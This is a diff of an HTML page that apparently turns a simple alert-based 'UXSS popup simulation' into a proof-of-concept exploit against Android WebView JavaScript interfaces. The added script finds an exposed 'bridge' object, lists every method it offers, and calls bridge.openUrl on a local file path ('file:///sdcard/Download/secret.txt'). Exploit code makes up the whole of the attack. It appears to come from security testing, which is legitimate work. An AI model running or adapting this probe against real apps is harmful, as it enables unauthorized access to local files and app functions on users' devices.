@@ -1,24 +1,52 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Browser Popup UXSS Simulation</title>
-<script>
-function triggerPopupUXSS() {
-    // Payload langsung ke alert, simulate indirect UXSS di browser
-    alert('Indirect UXSS Popup Triggered!');
-}
-</script>
+  <meta charset="utf-8">
+  <title>WebView JSInterface PoC</title>
 </head>
 <body>
-<h1>Indirect UXSS - Browser Popup Simulation</h1>
+  <h1>🚨 WebView addJavascriptInterface PoC 🚨</h1>
+  <div id="output"></div>
 
-<!-- Link mirip deeplink -->
-<a href="#" onclick="triggerPopupUXSS()"
-   style="padding:15px; font-size:18px; background-color:#4CAF50; color:white; text-decoration:none;">
-   Click to Trigger UXSS Popup
-</a>
+  <script>
+    function log(msg) {
+      document.getElementById("output").innerHTML += msg + "<br>";
+    }
 
-<p>Ini simulate popup UXSS langsung muncul di browser, bukan di web page iframe target.</p>
+    try {
+      // cek apakah object "bridge" ada
+      if (typeof bridge !== "undefined") {
+        log("[+] Found JS Interface: bridge");
+
+        // dump semua property / method yang bisa diakses
+        for (var i in bridge) {
+          log(" -> " + i);
+        }
+
+        // coba manggil method umum (kalau ada)
+        try {
+          log("[+] Testing bridge.toString(): " + bridge.toString());
+        } catch (e) {
+          log("[-] Error calling toString(): " + e);
+        }
+
+        // contoh eksekusi method arbitrary kalau ada
+        // ganti 'openUrl' dengan nama method valid dari hasil dump
+        try {
+          if (typeof bridge.openUrl === "function") {
+            bridge.openUrl("file:///sdcard/Download/secret.txt");
+            log("[+] Called bridge.openUrl()");
+          }
+        } catch (e) {
+          log("[-] Error calling openUrl(): " + e);
+        }
+
+      } else {
+        log("[-] No 'bridge' object found.");
+      }
+    } catch (err) {
+      log("[-] Exception: " + err);
+    }
+  </script>
 </body>
 </html>
